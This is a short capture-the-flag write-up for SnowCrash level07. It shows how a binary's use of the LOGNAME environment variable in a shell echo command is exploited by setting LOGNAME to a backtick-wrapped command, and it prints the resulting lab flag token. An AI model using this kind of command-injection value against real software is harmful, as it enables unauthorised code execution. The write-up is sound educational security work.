## level07

We have a binary. `ltrace` tells us that it’s using `asprintf` to write the logged user. Looking for asprintf vulnerabilities I found [this explanation](https://stackoverflow.com/questions/12746885/why-use-asprintf-instead-of-sprintf) of what it is.

With GDB I checked what it exactly does:

```bash
0xffffcbe0│+0x0000: 0xffffcbf4  →  0x0804b1a0  →  "/bin/echo level07 "	 ← $esp
0xffffcbe4│+0x0004: 0x08048688  →  "/bin/echo %s "
0xffffcbe8│+0x0008: 0xffffd2e2  →  "level07"
```

I know that `level07` is the output of `getenv(LOGNAME)`.

Does it mean that I can change that value arbitrarily?

```bash
level07@SnowCrash:~$ ./level07 
level07
level07@SnowCrash:~$ export LOGNAME=foo
level07@SnowCrash:~$ ./level07 
foo
```

Ok… but then maybe I can get echo to evaluate what I pass it with backtick `...

```bash
level07@SnowCrash:~$ export LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### External resources
- [_Optional_] GDB

### Key Learnings
- Arbitrary code execution by changing environment variables